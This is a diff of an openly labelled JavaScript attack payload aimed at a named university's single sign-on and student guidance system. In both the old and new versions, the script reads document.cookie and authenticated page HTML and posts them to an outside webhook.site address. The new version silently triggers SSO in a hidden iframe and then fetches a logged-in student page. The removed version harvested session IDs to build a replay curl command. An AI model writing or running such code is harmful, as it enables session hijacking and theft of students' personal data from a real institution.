@@ -1,68 +1,63 @@
 (async () => {
-    var webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
+    // === 設定區域 ===
+    // 你的 Webhook 接收地址
+    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
     
-    // 收集環境資訊
-    var debugInfo = {
-        location: window.location.href,      // 當前頁面 URL
-        origin: window.location.origin,      // 當前 Origin (是 iportal2 還是 null?)
-        isIframe: window.self !== window.top,// 是否在 iframe 裡？
-        cookie: document.cookie              // 能讀到 Cookie 嗎？
-    };
-
-    // 發送除錯訊息
-    fetch(webhook, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: JSON.stringify(debugInfo)
-    });
-})();
-
-(async () => {
-    var webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
+    // SSO 入口 (位於 iportal2，用於觸發登入)
+    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
     
-    // 修正1：使用絕對路徑 (加斜線開頭)，防止相對路徑解析錯誤
+    // 攻擊目標 (位於 ap.itc，登入後才有權限訪問)
+    // 建議先試試看這個登入檢查點，或者你可以換成首頁 "/GuidanceApp/index.do"
+    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; 
+    // const targetUrl = "/GuidanceApp/student/studentInfo.do"; // 備用目標
 
-	
-    // 注意：你原本的代碼這裡少了引號，這會導致語法錯誤，記得加上
-    var ssoUrl = "/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
-
+    // === 攻擊邏輯 ===
     try {
-        const response = await fetch(ssoUrl);
-        // 獲取最終 URL，確認有沒有發生非預期的跳轉
-        const finalUrl = response.url; 
-        const html = await response.text();
+        // 1. 創建隱藏的子 Iframe (Level 3)
+        // 這會利用瀏覽器自動攜帶 iportal2 Cookie 的特性，完成 SSO 流程
+        // 並將新的 ap.itc Session Cookie 寫入瀏覽器
+        const ifr = document.createElement('iframe');
+        ifr.style.display = 'none';
+        ifr.src = ssoUrl;
+        document.body.appendChild(ifr);
 
-        // 嘗試提取
-        const sessionMatch = html.match(/name=["']?sessionId["']?[\s\S]*?value=["']?([^"'\s>]+)["']?/i);
-        const userMatch = html.match(/name=["']?userid["']?[\s\S]*?value=["']?([^"'\s>]+)["']?/i);
+        // 回報狀態：開始攻擊
+        fetch(webhook + "?step=1_triggering_sso");
 
-        // 數據包
-        const data = {
-            status: (sessionMatch && userMatch) ? "SUCCESS" : "FAILED",
-            fetched_url: finalUrl, // 讓你知道最後抓的是哪個網址
-            
-            // 修正2：這是關鍵！把 HTML 傳回來讓我們看看到底發生了什麼
-            debug_html_preview: html.substring(0, 1500), 
-            
-            sessionId: sessionMatch ? sessionMatch[1] : "NOT_FOUND",
-            
-            curl_command: sessionMatch
-                ? `curl -i -s -k -X POST 'https://ap.itc.ntnu.edu.tw/GuidanceApp/StdtLoginCtrl?PageType=1B' \
--H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' \
--H 'Referer: https://iportal2.ntnu.edu.tw/' \
--H 'Origin: https://iportal2.ntnu.edu.tw' \
--H 'Content-Type: application/x-www-form-urlencoded' \
---data-raw 'sessionId=${encodeURIComponent(sessionMatch[1])}&userid=${userMatch[1]}&Action=Login&lang=zh_TW'`
-                : "N/A"
+        // 2. 等待 SSO 流程完成
+        // 這需要一點時間讓子 iframe 載入、執行 JS、POST、重導向
+        // 設定 5 秒應該足夠，如果網路慢可以設久一點
+        await new Promise(resolve => setTimeout(resolve, 5000));
+
+        // 3. 嘗試讀取目標資料 (Level 2 - 自身環境)
+        // 此時 Session 應該已經建立，且因為我們在 ap.itc 同源環境，可以直接 fetch
+        const response = await fetch(targetUrl);
+        const content = await response.text();
+
+        // 4. 回傳戰果
+        const loot = {
+            msg: "Attack Completed",
+            current_origin: window.location.origin,
+            target_url: targetUrl,
+            status_code: response.status,
+            // 抓取部分內容預覽 (避免過長)
+            html_preview: content.substring(0, 2000),
+            // 所有的 Cookie (包含剛剛 SSO 拿到的新 Session)
+            cookies: document.cookie
         };
 
-        fetch(webhook, {
-            method: "POST",
-            mode: "no-cors",
-            body: JSON.stringify(data),
+        await fetch(webhook, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(loot)
         });
 
+        // 5. (可選) 清理現場
+        // document.body.removeChild(ifr); 
+        // 建議不要太快移除，以免流程還沒跑完，或者為了保持 Session 活躍
+
     } catch (e) {
+        // 錯誤處理
         fetch(webhook + "?error=" + encodeURIComponent(e.message));
     }
 })();
